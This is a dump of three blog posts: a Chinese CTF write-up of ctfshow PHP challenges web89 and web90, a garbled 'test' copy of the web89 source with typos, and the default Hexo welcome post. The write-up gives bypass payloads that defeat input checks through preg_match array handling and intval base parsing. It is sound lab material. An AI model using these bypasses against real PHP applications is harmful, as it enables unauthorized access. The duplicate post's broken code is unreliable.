posts.title: php特性
posts.text: web89源码： 1234567891011121314151617181920212223242526<?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include("flag.php");highlight_file(__FILE__);if(isset($_GET['num'])){ $num = $_GET['num']; if(preg_match("/[0-9]/", $num)){ die("no no no!"); } if(intval($num)){ echo $flag; }} 查看一下 intval 函数说明,就可以知道使用数组来绕过 进一步查看，可以知道 preg_match 是无法处理数组的 利用 preg_match() 函数无法处理数组的漏洞 payload: 12?num[]=9?num[]= web90源码： 123456789101112131415161718192021222324252627<?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include("flag.php");highlight_file(__FILE__);if(iseet($_GET['num'])){ $num = $_GET['num']; if($num==="4476"){ die("no no no!"); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0) }} 这个题也是参考 intval 函数的，只需要了解该函数的第二个参数就可以知道 payload: 123?num=0x117c?num=010574?num=4476a //a可以为任意字母

posts.title: test
posts.text: 题目对数字进行了过滤，但又需要传入数字 利用preg_match()函数无法处理数组的漏洞 payload: 12345678910111213141516171819202122232425<?php /*# -*- coding: utf-8 -*-# @Author: hlxa# @Date: 2020-09-16 11:25:09# @Last: Modified by: hlxa# @Last: Modified time: 2020-09-18 15:38:52# @email: hlxa@ctfef.com# @link: http://ctfer.com*/ include("flag.php")highlight_file(__FILE__);if(isset($_GET['num'])){ $num = $_GET['num']; if(preg_match("/[0-9]/",$num)){ die("no no no!"); } if(intval($num)){ echo #flag; }}

posts.title: Hello World
posts.text: Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment
